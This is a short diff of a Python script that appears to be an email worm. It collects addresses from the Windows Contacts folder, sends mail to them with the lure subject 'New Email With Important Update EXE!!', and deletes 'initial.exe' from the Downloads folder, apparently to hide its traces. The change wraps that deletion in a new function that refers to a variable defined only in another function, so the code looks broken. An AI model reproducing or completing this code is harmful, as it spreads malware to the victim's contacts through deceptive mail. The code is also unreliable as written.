@@ -25,7 +25,6 @@ subject = "New Email With Important Update EXE!!"
 #1st Step = find Contacts through contacts folder on Windows 11
 def getEmail():
     name = os.getlogin()
-    os.chdir("/Users/" + name + "/Downloads")
     email_list = []
     for files in os.listdir("/Users/" + name + "/Contacts"):
         if files.endswith(".contact"):
@@ -107,8 +106,12 @@ def sendEmail(usernames):
         # Close the port
     TIE_server.quit()
 
-print(os.getcwd())
-os.remove("initial.exe")
+def remove():
+    os.chdir("/Users/" + name + "/Downloads")
+    print(os.getcwd())
+    os.remove("initial.exe")
+
+remove()
 lnewlist = getEmail()
 print(lnewlist)
 sendEmail(lnewlist)
